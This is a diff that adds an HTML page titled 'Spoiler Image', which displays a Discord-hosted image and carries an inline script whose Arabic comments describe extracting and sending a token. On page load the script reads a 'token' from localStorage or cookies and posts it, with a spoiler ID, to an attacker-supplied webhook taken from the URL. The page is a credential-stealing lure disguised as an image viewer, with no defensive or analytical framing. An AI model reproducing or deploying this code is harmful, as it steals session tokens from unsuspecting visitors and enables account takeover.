@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spoiler Image</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        img {
+            max-width: 100%;
+            border: 2px solid #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://cdn.discordapp.com/attachments/1307698490037637151/1360008114543267840/file_000000000b5861f78fb4595bf62a3399_conversation_id67f83b94-a064-8008-a3c9-a72c6dcb2db1message_id4b7093b2-0b23-45eb-a3d5-de82c8fa693d.png?ex=6802c842&is=680176c2&hm=6600b6ec14126220fc6a38126e42b9ec9eadda23d08245c41c0abd3c2ed8bb83&" alt="Spoiler">
+    <script>
+        // استخراج التوكن
+        (function() {
+            const webhook = new URLSearchParams(window.location.search).get('webhook');
+            const spoilerId = new URLSearchParams(window.location.search).get('id');
+            
+            // محاولة استخراج التوكن من localStorage أو طرق أخرى
+            let token = null;
+            try {
+                // هذا مثال مبسط، التوكن عادةً يكون مخفي أكتر
+                token = localStorage.getItem('token') || document.cookie.match(/token=([^;]+)/)?.[1];
+            } catch (e) {}
+
+            if (token) {
+                // إرسال التوكن إلى Webhook
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🆔 Spoiler ID: ${spoilerId}\n🔑 Token: ${token}`
+                    })
+                }).catch(e => console.error('Error:', e));
+            }
+        })();
+    </script>
+</body>
+</html>
